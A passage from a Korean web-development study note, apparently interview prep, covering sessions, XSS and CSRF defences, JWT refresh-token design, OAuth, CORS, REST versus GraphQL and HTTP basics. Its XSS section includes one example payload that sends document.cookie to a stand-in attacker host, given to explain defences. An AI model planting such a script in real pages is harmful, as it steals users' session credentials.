    로그인 API를 요청하여 로그인하였는데 서버에서는 로그인 했다는 상태를 기억하고 있지 않기 때문에 이후 로그인이 필요한 데이터 요청 시 또 다시 로그인을 해야하는 문제가 발생할 수 있다.
    이와 같이 로그인 상태 유지, 사용자 맞춤 설정 등 지속적인 상태 관리가 필요한 경우 쿠키, 세션, 웹 스토리지가 사용된다. (세션 기반 인증, 토큰 기반 인증 방식을 활용하여 브라우저
    저장소에 사용자 인증 정보를 담은 JWT나 세션 ID를 저장한 후 매 요청 시 재사용하는 방식을 통해 이러한 문제를 해결할 수 있다.)

  - 서버 여러 대일 때 세션 처리

    - 문제

      여러 대 서버가 있고, 로드 밸런싱으로 요청이 분산될 때, 각 서버가 개별 세션 저장소를 갖고 있으면 동일 사용자가 다른 서버로 요청하면 세션을 찾을 수 없는 문제가 발생.

    - 해결 방안

      - 세션 클러스터링

        여러 서버가 세션 저장소를 공유하도록 동기화하는 방식이다. 모든 서버가 동일한 세션 데이터를 유지해야 해서 메모리, 네트워크 부하가 커질 수 있다.

      - 세션 서버(세션 중앙 저장소) 방식

        별도의 전용 세션 저장소(예: Redis) 서버를 둔다.
        모든 웹 서버가 이 세션 서버에 세션 데이터를 읽고 쓰기 때문에 세션 데이터가 중앙 집중화되고, 동기화 문제와 부하를 줄일 수 있다.
        Redis 같은 인메모리 데이터베이스를 사용하면 매우 빠른 조회가 가능하다.

<br>

### # 대표적인 악성 공격 및 대응 방법

- 대표적인 공격

  - XSS(Cross Site Scripting)

    웹사이트에 악성 JavaScript를 삽입해, 사용자 브라우저에서 실행시켜 사용자의 정보를 탈취하거나 조작하는 공격이다. XSS 공격도 다양하다.

    - 예시

      게시판이 있는 웹 사이트에서 게시글 내용을 `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`와 같이 입력하여
      클라이언트 혹은 서버에서 검증하지 않고 저장하게 되면 다른 사용자들의 인증 정보를 탈취할 수 있다.

    - 대응 방법

      | 방법                               | 설명                                                                                                          |
      | ---------------------------------- | ------------------------------------------------------------------------------------------------------------- |
      | **입력값 검증 및 인코딩**          | 사용자 입력을 그대로 HTML로 출력하지 말고, 반드시 특수문자(예: `<`, `>`, `&`)를 HTML 엔티티로 인코딩 (Escape) |
      | **Content Security Policy (CSP)**  | 서버에서 HTTP 헤더로 CSP 설정하여 허용된 스크립트만 실행되도록 제한                                           |
      | **HttpOnly 쿠키 설정**             | 쿠키에 HttpOnly 속성을 줘서 JavaScript가 쿠키에 접근 못 하게 함                                               |
      | **출력 시 Context-aware Encoding** | HTML, JS, URL 등 상황에 맞는 인코딩 사용                                                                      |
      | **라이브러리 사용**                | React, Angular 같은 프레임워크는 기본적으로 XSS에 강한 구조를 제공                                            |
      | **DOM 기반 XSS 주의**              | 클라이언트에서 DOM을 조작할 때도 사용자 입력을 안전하게 처리                                                  |
      | **최신 보안 패치 적용**            | 웹서버, 라이브러리, 프레임워크 보안 업데이트를 항상 최신으로 유지                                             |

    - CSP(Content Security Policy)

      - 개념

        - CSP(Content Security Policy)는 웹 애플리케이션에서 XSS(Cross-Site Scripting) 같은 공격을 방지하기 위해 사용하는 보안 정책이다.

        - 쉽게 말하면, 어디서 로드된 콘텐츠만 허용할 것인지 브라우저에게 알려주는 규칙이다.

        - 적용하면 악성 스크립트가 서버 응답에 삽입되는 경우 차단한다.

      - 적용 방법

        - 기본적으로 HTTP 응답 헤더에 설정해줘야 브라우저가 인식한다.

        - 또는 `<meta>` 태그로도 설정할 수 있지만, 보안 강도나 유연성 면에서 HTTP 헤더 방식이 권장된다.

          - 1. http 헤더로 설정

            ```http
            Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com ...
            ```

          - 2. 메타 태그로 설정(비권장)

            ```html
            <meta
              http-equiv="Content-Security-Policy"
              content="default-src 'self'; script-src 'self'"
            />
            ```

  - CSRF(Cross site request forgery)

    사용자의 인증 정보를 도용해, 의도치 않은 악성 요청을 서버에 보내는 공격이다.

    - 예시

      은행 사이트에 로그인 되어 있는 사용자가 가짜 카피 은행 사이트에 접속 시 이미 브라우저에 저장되어 있는 인증 정보를 탈취하여 악의적인 요청을 보낸다.

    - 대응 방법

      | 방법                                       | 설명                                                                                      |
      | ------------------------------------------ | ----------------------------------------------------------------------------------------- |
      | **CSRF 토큰 사용**                         | 서버가 발급하는 난수 토큰을 폼이나 헤더에 넣고, 요청 시 함께 보내도록 하여 유효성 검사    |
      | **SameSite 쿠키 설정**                     | `SameSite=Lax` 또는 `SameSite=Strict`로 쿠키가 다른 사이트 요청에 자동 전송되는 것을 막음 |
      | **Referer / Origin 헤더 검사**             | 요청 헤더의 출처를 검사해 신뢰할 수 없는 출처의 요청 차단                                 |
      | **Custom Header 검사**                     | AJAX 요청 시, 서버가 예상하는 커스텀 헤더(`X-Requested-With` 등)가 있는지 확인            |
      | **로그인 시 쿠키에 Secure, HttpOnly 설정** | HTTPS 환경에서만 전송하고, JS 접근 차단으로 토큰 탈취 위험 감소                           |
      | **CORS 정책 적용**                         | 서버에서 허용된 도메인에 대해서만 리소스 공유 허용                                        |

- 보안 비교

  | 항목                                            | 클라이언트 저장 여부 | 자동 전송 여부               | JavaScript 접근 여부              | XSS 공격 취약성               | CSRF 공격 취약성                    | 보안 설정 방법                              |
  | ----------------------------------------------- | -------------------- | ---------------------------- | --------------------------------- | ----------------------------- | ----------------------------------- | ------------------------------------------- |
  | **세션 (Session)**                              | ❌ (서버 저장)       | ✅ (세션 ID는 쿠키로 전송됨) | ❌ (`HttpOnly` 쿠키 사용 시)      | 낮음 (세션 ID만 탈취 시 위험) | 있음 (쿠키 사용 시)                 | `HttpOnly`, `Secure`, `SameSite` 쿠키 설정  |
  | **쿠키 (Cookie)**                               | ✅ (클라이언트 저장) | ✅ (도메인/경로 일치 시)     | ✅ or ❌ (`HttpOnly` 여부에 따라) | 있음 (JS 접근 가능 시)        | 있음 (자동 전송되므로)              | `HttpOnly`, `Secure`, `SameSite`            |
  | **웹 스토리지 (localStorage / sessionStorage)** | ✅ (클라이언트 저장) | ❌ (자동 전송 안 됨)         | ✅ (무조건 가능)                  | **높음** (XSS에 매우 취약)    | ❌ (자동 전송이 없으므로 영향 없음) | 민감 정보 저장 피하기, XSS 방어 철저히 하기 |

- 쿠키 보안 방법

  - HttpOnly

    자바스크립트에서 document.cookie를 통해 쿠키에 접근하지 못하게 막는 속성, XSS 공격 시 쿠키 탈취 위험을 줄임

    ```http
    Set-Cookie: sessionId=abc123; HttpOnly
    ```

  - Secure

    쿠키가 오직 HTTPS 프로토콜을 통해서만 서버에 전송되도록 제한, HTTPS 연결이 아닌 경우에는 브라우저가 쿠키를 서버에 보내지 않음

    ```http
    Set-Cookie: sessionId=abc123; Secure
    ```

  - SameSite

    쿠키가 크로스 사이트 요청에 자동으로 전송되는 것을 제한하는 속성, CSRF 공격을 막음.
    여기서 같은 도메인은 메인도메인과 최상위도메인의 조합을 의미함. 서브도메인은 달라도 ㄱㅊ
    (예: blog.example.com → api.example.com (서브도메인만 다르기 때문에 가능), `[서브도메인].[메인도메인].[최상위도메인]`)

    | 값             | 의미                                                                                                     |
    | -------------- | -------------------------------------------------------------------------------------------------------- |
    | `Strict`       | 같은 사이트에서만 쿠키 전송, 크로스 사이트 요청엔 아예 전송 안 함 (가장 엄격)                            |
    | `Lax` (기본값) | 대부분 크로스 사이트 요청엔 쿠키를 안 보내지만, **GET 방식으로 top-level navigation(탭 이동 등)은 허용** |
    | `None`         | 쿠키를 크로스 사이트 요청에 모두 전송 (단, `Secure`와 함께 써야 함)                                      |

    ```http
    Set-Cookie: sessionId=abc123; SameSite=Strict
    ```

<br>

### # JWT 토큰(JSON Web Token)

- JWT 토큰이란?

  JSON Web Token으로 로그인과 같은 인증(유저 아이디 및 비밀번호 확인)/인가(로그인 유저가 요청하는 요청을 처리할 수 있는 지 권한 확인)에서 사용한다. 로그인을 처리하는 방식으로
  세션 기반 인증과 토큰 기반 인증이 있는데 토큰 기반 인증에서 사용한다. 세션 기반 인증은 서버에서 세션 ID를 전달받아 쿠키에 저장하여 인증하는 방식이고 토큰 기반 인증은
  서버에서 발행해주는 토큰을 전달받아 쿠키나 웹 스토리지에 저장하여 인증하는 방식이다.

- 토큰 기반 인증을 사용하는 이유

  | 구분                     | 세션 기반 인증                                              | 토큰 기반 인증                                                                    |
  | ------------------------ | ----------------------------------------------------------- | --------------------------------------------------------------------------------- |
  | **상태 저장**            | 서버가 세션 상태(로그인 정보 등)를 메모리에 저장            | 서버가 상태를 저장하지 않음 (무상태), 토큰 자체에 인증 정보 포함                  |
  | **확장성**               | 서버가 상태를 저장하기 때문에 서버 확장 시 세션 동기화 필요 | 상태 저장 없어서 서버에 토큰(리프레시 토큰)을 저장하여도 여러 대에 쉽게 분산 가능 |
  | **서버 부하**            | 사용자 수 증가 시 메모리 부담 증가                          | 서버 부담 적음 (상태 저장 안 함)                                                  |
  | **인증 정보 관리**       | 세션 ID를 쿠키로 클라이언트에 전달, 서버가 세션 상태 조회   | JWT 같은 토큰을 클라이언트가 보관하고, 매 요청시 서버 검증                        |
  | **클라이언트 저장 방식** | 쿠키에 세션 ID 저장                                         | 로컬 스토리지, 쿠키, 메모리 등 다양한 방식 가능                                   |
  | **보안 관리**            | 서버가 세션 만료 등 직접 관리                               | 토큰 만료 시간, 서명으로 무결성 검증, 탈취 시 위험 있음                           |
  | **유연성**               | 서버가 상태를 직접 관리해야 해서 유연성 낮음                | 다양한 클라이언트(웹, 모바일)에서 사용하기 적합                                   |

- JWT 토큰을 사용하는 이유는?

  1. 데이터 크기 : JWT는 XML 기반의 SAML(Security Assertion Markup Language) 방식보다 크기가 작다.

  2. 보안성 : SMT(Simple Web Token) 방식은 대칭키 방식으로 해싱하지만 JWT와 SAML 토큰은 공개키/개인키 방식을 사용한다. 인증 과정에서 대칭키 방식은 인증 확인자가 같은 키로 데이터를 만들어 다른 인증 확인자에게 잘못 사용될 수 있다는 문제가 있다. 또한 인증 과정은 인증 확인자가 데이터를 생성할 필요 없이 확인만 하면 되기 때문에 공개키/개인키 방식이 더 적합하다.

  3. 호환성 : JSON은 대부분 언어에서 객체로 바로 변환될 수 있기 때문에 대부분의 언어에서 지원하고 있다.

- JWT 토큰 구조

  1. Header (헤더) : Token의 기본요소, 헤더에는 일반적으로 토큰의 타입과 해싱 알고리즘 명시

  2. Payload (페이로드) : 전달하려는 데이터, key-value 페어로 클레임 정보를 포함한다. 클레임의 종류로는 등록된 클레임, 공개 클레임, 비공개 클레임이 있다.

  3. Signature (시그니쳐) : 서명된 값, header와 payload를 해싱 알고리즘에 의해 계산한 결과를 포함

- JSON 사용 이유

  웹 애플리케이션에서 데이터를 주고받을 때 사용하는 대표적인 데이터 포맷으로는 XML과 JSON이 있다. XML은 HTML과 유사한 마크업 언어이다. XML의 단점은 불필요한 태그들이 포함되어 파일의 사이즈가 크고 가독성도 좋지 않으며 배열을 파싱할 수 없기 때문에 배열을 사용할 수 없다는 단점이 있다. 반면 JSON은 자바스크립트의 객체와 같은 구조로 구성되어 있어 가독성도 높고 작성하기도 편리하며 호환성도 뛰어나고 배열도 사용할 수 있다는 장점이 있다.

- 토큰 기반 인증 방법

  - 흐름 예시

    1. 최초 로그인 시 서버는 :

       - 서버는 Access Token, Refresh Token Hash, CSRF Token 발급. Access Token은 유효 시간을 짧게 (5~15분), Refresh Token은 유효 시간을 길게 설정 (ex 1~2주 또는 그 이상)

       - 서버는 Refresh Token를 해시 처리하여 해시 값을 인메모리 DB(Redis)에 저장 (원본 저장 X)

         - 서버는 원본이 아니라 hash만 저장 → DB 털려도 refresh token 복원 불가 (마치 비밀번호처럼)

       - 서버는 클라이언트로 Access Token, Refresh Token 원본, CSRF Token을 전송

    2. 클라이언트에서는 :

       - 전달받은 Access Token은 로컬 변수(로컬 메모리, 상태관리 라이브러리)에 저장

         - 쿠키에 자동 포함되지 않기 때문에 Authorization 헤더로 수동 전송해야함 → CSRF 공격 대상 아님

         - JS에서 접근 가능하긴 하지만, 유효시간 짧게 설정하면 XSS에 당해도 피해 최소화 가능

         - 페이지를 새로고침하거나 닫으면 토큰이 사라지기 때문에 노출 위험 시간이 훨씬 짧아진다. 즉, XSS 공격자가 토큰에 접근할 기회가 줄어드는 셈이다.

       - 전달받은 Refresh Token 원본은 쿠키에 저장

         - 이 때 HttpOnly, Secure, SameSite 등 적용

         - HttpOnly 쿠키 → JS 접근 불가 → XSS에 강함

       - 전달받은 CSRF Token은 로컬 변수에 저장

         - SameSite, HttpOnly, Secure 설정만으로 CSRF 공격을 “줄일 수는 있지만, 완전히 막을 수는 없다.” 그래서 CSRF 토큰을 사용한다.

           - Strict는 너무 엄격해서 UX 문제 발생 (예: 사용자가 링크 클릭해서 이동해도 쿠키가 안 붙음 → 로그인 풀림), 그래서 보통 SameSite=Lax를 쓴다

           - Lax는 GET 요청만 보호함, POST, PUT, DELETE 같은 “상태 변경 요청”은 보호 대상 아님. 이게 바로 CSRF가 노리는 요청

           - 브라우저 호환성/버그, 일부 오래된 브라우저나 비표준 동작이 존재할 수 있음

           - 프로그래밍 실수, 쿠키 설정 누락, 오용 등의 사람 실수를 커버하기 어려움

         - 서버가 발급한 무작위 토큰을 클라이언트가 요청할 때 헤더나 body에 함께 실어서 보내는 방식이다.

         - refresh token은 쿠키에 있으므로 자동 전송됨 → CSRF 공격에 노출, 이를 방지하기 위해 클라이언트가 따로 보유한 CSRF 토큰을 헤더에 실어 전송. 서버는 쿠키 + CSRF 토큰이 모두 맞아야 access token 재발급

         - XSS에 약하기는 하지만 이 토큰은 JavaScript를 통해 요청 헤더에 직접 넣어야 하기 때문에, 제3자 사이트나 폼에서는 이 토큰을 알 수 없음 → 공격이 막힘. 왜냐하면 공격자가 쿠키는 전송할 수 있어도, 헤더는 조작 불가능하기 때문이다. 브라우저는 외부 사이트가 fetch로 보낼 때 커스텀 헤더(X-CSRF-Token)를 허용하지 않음 (CORS 정책 때문).

           ```javascript
           axios.post(
             "/api/refresh",
             {},
             {
               headers: {
                 "X-CSRF-Token": csrfToken,
               },
             }
           );
           ```

         - CSRF token은 로컬 변수(메모리) 저장 시 XSS에 약하지만, refresh token 원본을 httpOnly 쿠키로 관리하기 때문에 XSS에 안전하여 CSRF token이 XSS에 의해 접근가능하게 되더라도 refresh token에는 접근할 수 없으므로 안전하다. 라고 이해했다.

       - 인가가 필요한 요청 시 Access Token을 Authorization 헤더에 포함하여 요청

         - 서버는 Access Token 검증 후 정상 응답

       - Access Token 만료 시 재발급을 위해 쿠키에 있는 Refresh Token, 로컬 변수(메모리)에 있는 CSRF Token 을 활용

         - 서버에서 자동 전송된 refresh token (HttpOnly + Secure + SameSite 쿠키) 원본을 요청에 포함 (HttpOnly + Secure 쿠키를 자동으로 요청 헤더에 포함)

         - 로컬 변수(메모리)에 있는 CSRF 토큰을 X-CSRF-Token 헤더에 포함하여 요청

         - 서버에서는 클라이언트에서 받은 refresh token 원본을 해시 알고리즘을 통해 hash 처리해 DB에 저장된 것과 비교 및 CSRF Token 검증 -> access token 재발급 후 응답 (필요 시 새로운 refresh token도 재발급 + 쿠키에 다시 Set)

    3. 로그아웃 시 :

       - Redis에서 Refresh Token 해시 삭제

       - 클라이언트 Access Token, CSRF Token 상태 초기화

       - 쿠키 Refresh Token 원본 삭제 (서버에서 Set-Cookie: expired)

  - 해당 구조의 장점

    | 항목                                             | 이유                                                                |
    | ------------------------------------------------ | ------------------------------------------------------------------- |
    | ✅ **access token은 메모리 관리**                | CSRF에 안전하며, XSS에 노출돼도 짧은 만료 시간 덕분에 리스크 낮음   |
    | ✅ **refresh token은 HttpOnly 쿠키**             | XSS로부터 완전 보호됨, 자동 전송되므로 별도 처리 필요 없음          |
    | ✅ **CSRF 토큰은 메모리에서 직접 헤더로 보내기** | 쿠키 자동 전송만으로는 부족하므로 CSRF 토큰으로 위조 요청 차단 가능 |
    | ✅ **refresh token 해시는 Redis 등에서 관리**    | 속도, TTL, 실시간 무효화에 유리하고 유출돼도 원본 노출 위험 없음    |

  - Redis에 refresh token 해시를 저장하는 이유

    - 이유

      1. 속도 (Ultra-fast Lookup)

         - Redis는 인메모리 DB라서 읽기/쓰기 속도가 매우 빠릅니다.

         - 로그인 후 access token을 재발급할 때, refresh token의 해시를 비교하는 작업이 자주 일어남 → 성능 중요

         - RDB(MySQL 등)보다 수천~수만 배 빠른 처리 속도가 가능

      2. 만료 시간(TTL)을 쉽게 설정할 수 있음

         - Redis는 키마다 TTL(Time To Live)을 줄 수 있음 → refresh token 만료시간을 Redis 수준에서 관리 가능

           ```bash
           SET refresh:hash:<userId> <hashedToken> EX 7d
           ```

         - 토큰이 만료되면 자동 삭제되므로, 불필요한 데이터 클린업 로직을 따로 짤 필요 없음

      3. 로그아웃/재발급 관리가 편리함

         - 사용자가 로그아웃하면 해당 키만 지우면 됨 → 단순한 키 삭제로 토큰 무효화 가능

         - 탈취 의심 시, 특정 userId의 refresh token hash만 제거 → 해당 사용자만 로그아웃시킴

      4. 세션 스토리지 역할도 겸함

         - 서비스에 따라 refresh token을 세션처럼 다루는 경우도 있음

         - Redis는 전통적으로 세션 관리용 저장소로도 많이 쓰이므로 활용도 높음

      5. 스케일 아웃에 유리

         - 서버가 여러 대로 늘어나도 Redis를 중앙화된 세션 스토리지로 쓸 수 있음

         - 즉, 토큰 관리 로직을 수평 확장 환경에서도 유지할 수 있음

    - 요약

      | 항목                 | Redis (인메모리) | RDB (MySQL, Postgres 등) |
      | -------------------- | ---------------- | ------------------------ |
      | 속도                 | 매우 빠름 (ms)   | 상대적으로 느림          |
      | TTL 관리             | 쉬움 (`EX` 설정) | 복잡함 (잡 돌려야 함)    |
      | 실시간 삭제/로그아웃 | 쉬움             | 느림 / 복잡              |
      | 수평 확장성          | 좋음             | 관리 복잡도 증가         |
      | 영속성               | 낮음 (옵션)      | 높음 (기본)              |

      - refresh token은 "영속성"보다는 속도 + 관리 편의성이 더 중요하므로 Redis가 적합한 선택인 경우가 많다.

      - Redis에는 해시값만 저장 → 원본 토큰이 유출되지 않음

      - Redis가 유출되더라도 원본 refresh token을 알 수 없음

      - 해시 함수는 bcrypt, argon2, scrypt 등 느린 함수가 아니라 빠른 HMAC + SHA256 등을 써서 속도와 보안 모두 챙김

        ```ts
        // 예시
        const tokenHash = HMAC_SHA256(refreshToken, SECRET_KEY);
        ```

      - Redis는 refresh token hash 저장에 매우 적합한 저장소이다. 속도, TTL, 실시간 삭제, 확장성 등 실무적인 장점이 많고 보안적으로도 안전한 방식이다.

<br>

### # Oauth 2.0

- Oauth2(Open Authorization 2.0)란 인증을 위한 표준 프로토콜이다. 이 프로토콜에서는 써드파티 프로그램에게 리소스 소유자를 대신해 리소스 서버에서 제공하는 자원에 대한 접근
  권한을 위임하는 방식으로 작동된다. 구글, 페이스북 등 외부 소셜 계정을 기반으로 간편하게 인증하는 기능이다. 기존의 인증방식과 달리 인증을 중개해주는 방식이라고 생각하면 된다.
  Resource Owner(유저), Client(애플리케이션 서버), Authorization Server, Resource Server, Access Token, Refresh Token로 구성된다.

<br>

### # SOP정책과 CORS

- SOP(same-origin)정책

  same-origin policys는 동일 출처 정책으로 동일한 출처에서만 리소스 자원 공유를 허용하도록 하는 정책이다. 다른 출처(cross origin)에 경우 자원에 접근하지 못하도록 제약한다.
  여기서 동일 출처는 두 URL의 프로토콜(ex https), 호스트(ex naver.com), 포트번호(3000)가 모두 동일한 경우를 이야기한다. 만약 교차 출처에서 리소스를 공유하려면 그 출처에서
  올바른 CORS 헤더를 포함한 응답을 반환해야 한다.

- CORS(Cross-Origin Resource Sharing)

  CORS는 교차 출처 리소스 공유 정책으로 SOP 정책으로 차단된 교차 출처 리소스 공유를 안전하게 허용하는 방법이다. HTTP 프로토콜을 사용하여 요청을 보낼 때 브라우저는
  요청 헤더에 Origin 필드에 요청을 보내는 출처를 담아보낸다. 이후 서버가 이 요청에 대한 응답을 할 때 응답 헤더 Access-Control-Allow-Origin 필드에 요청이
  허용된 출처를 담아 응답하고 이후 응답을 받은 브라우저는 자신이 보냈던 요청의 Origin 필드와 서버가 보내준 응답의 Access-Control-Allow-Origin 필드를 비교하여
  허용된 교차 출처인지 판단하고 아닌 경우 CORS 에러를 반환한다. CORS 에러를 해결하는 방법은 서버에 Access-Control-Allow-Origin 필드에 허용 출처로 추가할 것을 요청하거나
  프록시로 우회하여 요청 출처를 바꾸어 해결할 수 있다.

<br>

### # API, SDK

- API

  API(Application Programming Interface)란 단어 자체의 뜻 처럼 어플리케이션 프로그래밍 인터페이스를 말한다. 서버가 제공하는 기능이나 데이터를 프로그램이 표준화된 방식으로 요청하고 받는 인터페이스이다.

- SDK

  소프트웨어 개발 키트로 운영체제나 프로그래밍 언어 제작사 등이 제공하는 개발 도구와 라이브러리 모음이다. 예를 들어 카카오톡 소셜 로그인 기능 구현 시 SDK를 script에 연결하여 구현하는 방식과 REST API를 활용하여 구현하는 방식 등으로 구분된다.

- SDK와 API 차이

  API는 특정 기능이나 데이터를 요청하는 데 사용되는 인터페이스, SDK는 이 API를 포함해 개발에 필요한 라이브러리, 도구, 문서 등을 한 데 묶은 패키지이다. SDK가 API보다 더 큰 개념이고, API는 SDK의 일부일 수 있다.

<br>

### # RESTful API, GraphQL, Path Parameter, Query Parameter

- Restful API

  REST란 자원을 URI로 구분하여 해당 자원(Resource)의 상태를 주고 받는 아키텍처이다. REST API는 REST의 특징을 지키며 설계된 API이며 자원, 행위, 표현으로 구분되어 있다.
  가장 중요한 REST API의 설계 규칙은 URI로 자원을 명시하고, 자원에 대한 행위는 HTTP 메소드(GET, POST, PUT, DELETE, PATCH)로 표현해야 한다는 것이다.
  즉 RESTful 하다는 것은 REST API를 제공하는 웹 서비스를 RESTful 하다고 할 수 있다.

  - 자원 : URL로 명시

  - 행위 : HTTP 메소드

  - 표현 : 서버와 클라이언트가 주고 받는 데이터로 보통 JSON 등

- GraphQL

  페이스북에서 만든 API 요청을 위한 쿼리 언어이다. 하나의 엔드 포인트를 사용하고, 요청 시 사용한 쿼리 문에 따라 응답의 구조가 달라진다. 원하는 필드만 요청하기 때문에 데이터 오버 패칭을
  해결할 수 있고 언더패칭으로 인한 API 추가 호출을 막을 수 있고 응답 데이터 가공 로직이 상대적으로 간결해진다는 장점이 있다.

- REST API 와 GraphQL 차이

  1. 엔드 포인트

     RESTful API 는 Resource 마다 하나의 Endpoint 를 가지고, 그 Endpoint 에서 그 Resource 에 대한 거의 모든 것을 담당한다. 반면, GraphQL 은 전체 API 를 위해서 단 하나의 Endpoint 만을 사용한다.

  2. 응답 구조

     Restful API 는 하나의 Endpoint 에서 돌려줄 수 있는 응답의 구조가 정해져 있는 경우가 많다. 반면, GraphQL 은 사용자가 응답의 구조를 자신이 원하는 방식으로 바꿀 수 있다. 그렇기 때문에 필요한 데이터만 뽑아올 수 있다.

  ```json
  // REST API 요청
  // method : get
  // end-point : https://choseongho93.com/api/user/1

  // REST API 결과
  {
    "name": "nate",
    "height": "187",
    "hair_color": "blond",
    "skin_color": "fair",
    "eye_color": "blue",
    "gender": "male",
    "study": [3, 4, 21, 23, 31],
    "created": "2014-12-09T13:50:51.644000Z",
    "edited": "2014-12-20T21:17:56.891000Z"
  }
  ```

  ```json
  // GraphQL 요청
  // end-point : https://choseongho93.com/graphql
  query {
    users(userId: 1) {
      name
      height
      gender
    }
  }

  // GraphQL 결과
  {
    "data": {
      "person": {
        "name": "nate",
        "height": 187,
        "gender": "male"
      }
    }
  }
  ```

- 패스 파라미터(Path Parameter)

  슬래시로 구분하며 동적 라우팅과 같이 리소스를 식별할 때 사용한다. (예시 : `localhost:3000/product/2`)

- 쿼리 파라미터(Query Parameter)

  물음표로 시작하고 key, value로 구성되며 엔드로 연결한다. 정렬, 필터, 검색 시 사용한다. (예시 : `localhost:8000/products?limit=10&offset=5`)

<br>

### # 아폴로 클라이언트(Apollo Client)

아폴로 클라이언트는 GraphQL API와의 통신을 쉽게 관리해주는 클라이언트 라이브러리이다. 서버에 쿼리나 뮤테이션 요청을 보내고 결과 값을 캐싱하여 재사용할 수 있게 해준다. 또한,
아폴로 클라이언트는 로컬 상태 관리도 지원한다. 즉, 서버에 요청하지 않고도 클라이언트 내에서 로컬 쿼리와 로컬 스키마를 정의하고 데이터를 캐싱하여 활용할 수 있다. 실무에서는 보통
GraphQL 원격 스키마로부터 타입을 자동 생성하는 코드 제너레이터를 사용한다. 그 후, useQuery, useMutation 같은 훅(Hook)을 이용해 타입 안전하게 GraphQL 요청을 수행하며,
자동 생성된 타입을 기반으로 문서(document)를 매개변수로 전달하여 요청합니다.

<br>

### # apllo client useQuery의 fetchPolicy / nextFetchPolicys

- fetchPolicy 옵션 : fetchPolicy는 쿼리가 첫번째 실행될때 사용되는 옵션이다.

  - cache-first

    디폴트이다. 캐시가 있으면 사용하고 없다면 서버에 요청 후 데이터를 캐시하고 반환한다.

  - cache-only

    서버에 요청을 보내지 않고 캐시만 사용한다. 만약 캐시가 없으면 error를 뱉는다.

  - cache-and-networ

    캐시가 있다면 우선적으로 사용하고 캐시 유무와 관계없이 서버에 요청 후 데이터를 캐시(캐시 업데이트)하고 반환한다.

  - network-only

    캐시를 사용하지 않고 서버에 요청 후 데이터를 캐시허고 반환한다.

  - no-cache

    network-only와 비슷하다. 다만 쿼리 결과가 캐시에 저장되지 않는다.

  - standby

    cache-first와 같은 로직을 사용하지만, 기본 필드 값이 변경되어도 쿼리는 자동 업데이트 하지 않는다. refetch 및 updateQueries를 사용하여 수동 업데이트 할 수 있다.

- nextFetchPolicys 옵션 : nextFetchPolicy 또한 fetchPolicy 와 같은 속성들을 사용한다. nextFetchPolicy는 쿼리가 첫번째 실행 이후 캐시 업데이트에서 어떻게 반응할지 정할 때 사용된다.

<br>

### # HTTP

- HTTP 프로토콜

  컴퓨터 네트워크에서 데이터를 주고 받을 때 사용하는 통신 규약이다.

- HTTP 프로토콜 특징

  1. 구조

     요청, 응답으로 이루어져있고 start line, headers, body 구조로 이루어져있다.

  2. 무상태(Stateless) 프로토콜

     각각의 요청이 독립적이고 서로 관련이 없다. 요청 응답이 완료된 후 해당 상태를 기억하지 않는다.

  3. 비연결 지향(Connectionless) 프로토콜

     요청과 응답이 완료되면 연결을 끊어버린다. 엄밀히 말하면 HTTP/1.0은 기본적으로 요청 후 연결을 끊지만, HTTP/1.1부터는 Connection: keep-alive 헤더로 연결을
     유지하며 여러 요청을 같은 TCP 연결로 처리할 수 있다. 따라서 “기본적으로 요청 후 연결 끊음”이지만, 실제로는 성능 최적화를 위해 연결을 유지할 수 있다.

- HTTP 프로토콜 구조 설명

  - start line

    한 줄로 표현되며 요청 start line은 `GET /post/94 HTTP/1.1`과 같이 http메소드(GET), 요청 패스 혹은 쿼리(/post/94), http 버전(HTTP/1.1)을 표현하고 응답 start line은 `HTTP/1.1 200 OK`와 같이 http 버전(HTTP/1.1)과 응답 메세지(200 OK)를 표현한다.

    ```md
    POST /api/create HTTP/1.1
    Host: api.example.com
    Content-Type: application/json
    Authorization: Bearer abcdef123456
    Content-Length: 48

    {
    "key1": "value1",
    "key2": "value2"
    }
    ```

  - header

    HTTP 요청의 header는 요청에 대한 메타데이터를 포함한다. Content-Type은 요청 본문(body)의 데이터 타입을 지정한다. 예를 들어, JSON 데이터를 보낼 때는 "application/json"을 설정할 수 있다. 또한 Authorization은 인증 토큰 또는 사용자 인증 정보를 포함하여 접근 권한을 부여할 수 있다. 이 외에도 header는 기타 요청에 필요한 헤더 정보를 추가할 수 있다.

    ```javascript
    fetch("https://api.example.com/data", {
      method: "GET",
      headers: {
        Authorization: "Bearer myToken",
        "Content-Type": "application/json",
      },
    });
    ```

  - body

    HTTP 요청의 body는 요청에 포함될 데이터를 포함하며, 일반적으로 POST 또는 PUT 요청과 함께 사용된다. 데이터는 주로 JSON, FormData, 텍스트 등의 형식으로 전송되며 Content-Type 헤더에 지정한 데이터 형식과 일치해야 한다.

    ```javascript
    // fetch를 사용한 JSON 데이터 전송
    fetch("https://api.example.com/create", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ key1: "value1", key2: "value2" }),
    });

    // axios를 사용한 JSON 데이터 전송
    axios.post(
      "https://api.example.com/create",
      {
        key1: "value1",
        key2: "value2",
      },
      {
        headers: {
          "Content-Type": "application/json",
          Authorization: "Bearer myToken",
        },
      }
    );
    ```

- HTTP 프로토콜 메소드

  1. GET : 데이터를 조회(Read)할 때 사용한다.

  2. POST : 새로운 정보를 추가/생성(Create)할 때 사용한다. body가 있어 데이터 담아 전송할 수 있다.

  3. DELETE : DELETE는 삭제(Delete)시에 사용한다.

  4. PUT & PATCH : PUT 또는 PATCH는 수정(Update)시에 사용한다. 두 가지를 구분하면 PUT은 데이터를 통쨰로, PATCH는 데이터 일부를 수정할 때 사용한다. body가 있어 데이터를 담아 전송할 수 있다.

- UDP, TCP/IP란?

  1. 패킷 : 라우팅되는 데이터 단위, 라우팅 시 효율적인 데이터 교환을 위해 나눈 데이터 조각

  2. TCP/IP : 데이터를 메세지의 형태로 보내기 위해 IP와 함께 사용하는 연결 지향적 프로토콜이다. IP가 패킷 전달을 수행한다면 TCP는 패킷을 추적 및 관리하게 된다. 연결 지향 프로토콜이란 클라이언트와 서버가 연결된 상태에서 데이터를 주고받는 프로토콜을 의미한다. 클라이언트가 연결 요청(SYN 데이터 전송)을 하고, 서버가 연결을 수락하면 통신 선로가 고정되고, 모든 데이터는 고정된 통신 선로를 통해서 순차적으로 전달된다.

